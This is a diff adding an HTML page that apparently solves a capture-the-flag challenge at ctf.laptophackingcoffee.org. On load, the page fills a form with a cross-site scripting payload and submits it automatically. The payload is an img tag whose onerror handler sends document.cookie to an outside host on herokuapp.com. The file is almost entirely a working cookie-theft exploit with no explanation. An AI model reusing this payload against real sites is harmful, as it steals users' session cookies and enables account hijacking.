@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<form action="http://ctf.laptophackingcoffee.org:1337/dev.php" method="post">
+  Message: <input type="text" name="message" id="m"><br>
+  <input type="submit" value="Submit" id="s">
+</form>
+<script>
+var t="'https://ctf-solver.herokuapp.com/image?c='";
+var breaker='"this.value='+t+'+document.cookie"';
+document.getElementById('m').value="<img src='29u4287u429' onerror="+breaker+"><img>";
+document.getElementById('s').click();
+</script>
+<noscript>You're missing out.</noscript>
+</body>
+</html>
